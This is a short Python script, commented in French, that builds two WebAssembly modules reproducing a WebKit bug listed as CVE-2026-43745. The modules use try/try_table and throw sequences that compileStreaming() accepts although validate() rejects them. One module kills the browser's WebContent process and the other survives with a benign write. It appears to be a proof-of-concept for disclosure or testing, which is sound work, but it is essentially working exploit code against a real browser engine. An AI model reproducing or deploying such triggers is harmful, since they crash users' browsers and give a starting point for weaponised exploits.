#!/usr/bin/env python3
"""
Génère les deux modules Wasm de la série CVE-2026-43745 (bug WebKit 315365).

  crash_no_payload.wasm        -> tag sans payload ; run() tue le process WebContent
  survives_with_payload.wasm   -> tag (i32)->() avec payload ; run() survit (écriture bénigne)

Les deux passent `WebAssembly.validate` = false et sont refusés par compile(),
mais acceptés par compileStreaming() : c'est la divergence exploitée.

Usage: python gen_wasm.py
"""


def module(payload=0):
    instr = bytearray()
    instr += bytes([0x06, 0x40])                  # try (void)
    instr += bytes([0x01])                        # nop
    instr += bytes([0x19])                        # catch_all
    instr += bytes([0x09, 0x00])                  # rethrow 0
    instr += bytes([0x0b])                        # end (try)
    instr += bytes([0x02, 0x40])                  # block $h
    instr += bytes([0x1f, 0x40, 0x01, 0x02, 0x00])  # try_table (catch_all -> 0)
    if payload:
        instr += bytes([0x41, 0x2a])              # i32.const 42
    instr += bytes([0x08, 0x00])                  # throw $e
    instr += bytes([0x0b])                        # end (try_table)
    instr += bytes([0x0b])                        # end (block $h)
    instr += bytes([0x0b])                        # end (func)

    corps = bytes([0x00]) + bytes(instr)
    fonction = b"\x60" + (b"\x01\x7f" if payload else b"\x00") + b"\x00"
    tag = bytes([0x01, 0x00, 0x00])               # tag -> type 0

    mod = bytearray(b"\x00asm\x01\x00\x00\x00")
    mod += bytes([0x01, len(fonction) + 1, 0x01]) + fonction
    mod += bytes([0x03, 0x02, 0x01, 0x00])
    mod += bytes([0x0d, len(tag)]) + tag
    mod += bytes([0x07, 0x07, 0x01, 0x03]) + b"run" + bytes([0x00, 0x00])
    mod += bytes([0x0a, len(corps) + 2, 0x01, len(corps)]) + corps
    return bytes(mod)


if __name__ == "__main__":
    for nom, p in (("crash_no_payload.wasm", 0), ("survives_with_payload.wasm", 1)):
        data = module(p)
        open(nom, "wb").write(data)
        print(f"{nom}: {len(data)} octets")
